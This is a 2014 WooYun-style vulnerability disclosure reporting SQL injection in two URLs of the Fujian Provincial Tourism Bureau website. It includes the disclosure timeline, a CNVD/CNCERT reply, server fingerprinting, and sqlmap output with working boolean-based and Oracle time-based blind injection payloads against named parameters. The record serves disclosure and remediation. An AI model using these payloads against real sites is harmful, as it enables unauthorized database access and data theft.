wybug_title: 福建省旅游局 Oracle SQL注射
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-06-10：	细节已通知厂商并且等待厂商处理中									2014-06-14：	厂商已经确认，细节仅向厂商公开									2014-06-24：	细节向核心白帽子及相关领域专家公开									2014-07-04：	细节向普通白帽子公开									2014-07-14：	细节向实习白帽子公开									2014-07-25：	细节向公众公开  简要描述： 福建省旅游局SQL注射。 详细说明：  http://www.fjta.gov.cn/SystemManage/Vote/ShowVoteRate.aspx?AllQn=472&LanguageTypeID=0&Action=vote AllQn=472 存在sql注入漏洞http://www.fjta.gov.cn/news/newslist-1-130.html?t=%5b%e9%87%87%e7%bc%96%5d 存在sql注入漏洞   漏洞证明：  Place: GETParameter: AllQn    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: AllQn=472) AND 9190=9190 AND (6122=6122&LanguageTypeID=0&Action=vote    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: AllQn=472) AND 7532=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (2734=2734&LanguageTypeID=0&Action=vote---web server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: AllQn    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: AllQn=472) AND 9190=9190 AND (6122=6122&LanguageTypeID=0&Action=vote    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: AllQn=472) AND 7532=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (2734=2734sqlmap identified the following injection points with a total of 40 HTTP(s) requests:---Place: GETParameter: t    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: t=[%E9%87%87%E7%BC%96]' AND 6086=6086 AND 'hrXb'='hrXb---web server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: t    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: t=[%E9%87%87%E7%BC%96]' AND 6086=6086 AND 'hrXb'='hrXb---web server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Oracle

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-06-14 23:10 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给福建分中心处置，由其后续联系网站管理单位 最新状态： 暂无
